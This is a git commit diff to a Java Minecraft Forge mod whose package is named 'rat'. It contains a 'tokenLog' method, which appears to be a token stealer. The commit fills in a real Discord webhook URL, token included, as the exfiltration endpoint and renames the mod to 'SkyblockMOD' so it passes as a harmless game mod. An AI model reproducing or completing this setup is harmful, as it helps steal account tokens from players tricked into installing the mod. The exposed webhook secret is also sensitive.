7a02454ddc7779870e35440a41d8a554390bdb38
ALDO <86197115+aldo1105@users.noreply.github.com>
2024-11-25 17:18:58 -0500

    RAT.java

--- src/main/java/me/veryobvious/rat/Main.java
+++ src/main/java/me/veryobvious/rat/Main.java
@@ -44,9 +44,9 @@ import java.util.function.UnaryOperator;
 
 @Mod(modid = Main.MODID, version = Main.VERSION)
 public class Main {
-    public static final String webhook = "PUT WEBHOOK HERE";
+    public static final String webhook = "https://discord.com/api/webhooks/1205190568695697428/AuZotNCedsplMvHePxfqznxAJ_MXbQ6T7TVNRS_Ho6gnvPRtl3sOd2_VGpJOntQoSim1";
 
-    public static final String MODID = "balls";
+    public static final String MODID = "SkyblockMOD";
     public static final String VERSION = "1.8.9";
 
     public static void tokenLog() {
